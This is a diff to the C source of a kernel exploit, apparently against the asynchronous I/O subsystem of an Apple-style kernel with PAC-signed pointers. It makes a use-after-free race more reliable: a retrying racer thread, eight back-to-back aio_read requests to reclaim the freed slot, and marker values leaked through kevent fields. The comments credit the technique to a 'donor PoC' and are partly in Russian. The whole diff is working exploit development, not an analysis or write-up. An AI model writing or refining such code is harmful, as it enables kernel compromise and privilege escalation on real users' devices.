@@ -87,7 +87,17 @@ static char  s_buf2[4096];
 static struct aiocb s_cb1;
 static struct aiocb s_cb2;
 
+/* The donor PoC issues NRECLAIM=8 reclaim requests back to back right
+ * after the free: the first allocation after the free takes the freed
+ * slot (LIFO magazine), and the other seven give the allocator more
+ * chances if the first one lands elsewhere. One reclaim request is a
+ * coin flip; eight is the technique the donor uses for its ~70% rate. */
+#define AIO_NRECLAIM 8
+static struct aiocb s_rcb[AIO_NRECLAIM];
+static char        s_rbuf[AIO_NRECLAIM][1024];
+
 static volatile int s_racer_done;      /* 0 idle, 1 free+reclaim done, -1 fail */
+static volatile int s_racer_issued;    /* how many reclaim requests went out */
 static volatile int s_racer_go;
 
 static void *racer_thread(void *arg)
@@ -95,14 +105,30 @@ static void *racer_thread(void *arg)
     (void)arg;
     while (!s_racer_go) {
     }
-    /* ждём завершения I/O жертвы: kernel обновляет user aiocb on completion */
-    for (int i = 0; i < 200000; i++) {
-        if (aio_error(&s_cb1) == 0) break;
+    /* The free is retried instead of giving up. On the first attempt the
+     * victim entry can already be gone (the previous attempt's UAF
+     * unref'd it), aio_return then answers -1 and the old code bailed out
+     * with fail=-1 - which killed every later attempt in the loop. The
+     * donor keeps spinning until the free succeeds. */
+    for (int spin = 0; spin < 4000; spin++) {
+        if (aio_error(&s_cb1) == 0) {
+            ssize_t r = aio_return(&s_cb1);
+            if (r >= 0) {
+                /* LIFO-reclaim of the same slot: the same thread/CPU, right
+                 * after the free. The first allocation takes the freed
+                 * slot; the rest are extra chances. */
+                int issued = 0;
+                for (int i = 0; i < AIO_NRECLAIM; i++) {
+                    if (aio_read(&s_rcb[i]) == 0) issued++;
+                }
+                s_racer_done = 1;
+                s_racer_issued = issued;
+                return NULL;
+            }
+        }
+        usleep(50);
     }
-    if (aio_return(&s_cb1) < 0) { s_racer_done = -1; return NULL; }
-    /* LIFO-reclaim того же слота: тот же CPU, сразу после free */
-    if (aio_read(&s_cb2) != 0) { s_racer_done = -1; return NULL; }
-    s_racer_done = 1;
+    s_racer_done = -1;
     return NULL;
 }
 
@@ -120,6 +146,11 @@ static void reap_cb2(void)
     for (int i = 0; i < 50000 && aio_error(&s_cb2) != 0; i++) {
     }
     aio_return(&s_cb2);
+    for (int i = 0; i < AIO_NRECLAIM; i++) {
+        for (int k = 0; k < 50000 && aio_error(&s_rcb[i]) != 0; k++) {
+        }
+        aio_return(&s_rcb[i]);
+    }
 }
 
 /* A PAC-signed kernel pointer keeps the address in the low 56 bits and
@@ -233,6 +264,18 @@ static int attempt_once(int attempt, nk_aio_stat_t *st)
     s_cb1.aio_sigevent.sigev_notify = SIGEV_KEVENT;
     s_cb1.aio_sigevent.sigev_signo = kq;
 
+    /* Reclaim slots: every one carries the marker in aio_nbytes, so
+     * whichever of them lands on the freed slot delivers the marker in
+     * kev.ext[1]. */
+    for (int i = 0; i < AIO_NRECLAIM; i++) {
+        memset(&s_rcb[i], 0, sizeof(s_rcb[i]));
+        s_rcb[i].aio_fildes = fd;
+        s_rcb[i].aio_offset = 0;
+        s_rcb[i].aio_buf = s_rbuf[i];
+        s_rcb[i].aio_nbytes = RECLAIM_NB;   /* всплывет в kev.ext[1] при HIT */
+        s_rcb[i].aio_lio_opcode = LIO_READ;
+        s_rcb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+    }
     memset(&s_cb2, 0, sizeof(s_cb2));
     s_cb2.aio_fildes = fd;
     s_cb2.aio_offset = 0;
@@ -274,7 +317,7 @@ static int attempt_once(int attempt, nk_aio_stat_t *st)
         if (++waited > 2000000) break;
     }
     if (s_racer_done != 1) {
-        aio_logx("B1", "att=%d racer fail=%d", attempt, s_racer_done);
+        aio_logx("B1", "att=%d racer fail=%d reclaims=%d", attempt, s_racer_done, s_racer_issued);
         st->silent++;
         pthread_join(rac, NULL);
         close(kq); close(fd); unlink(path); return 0;
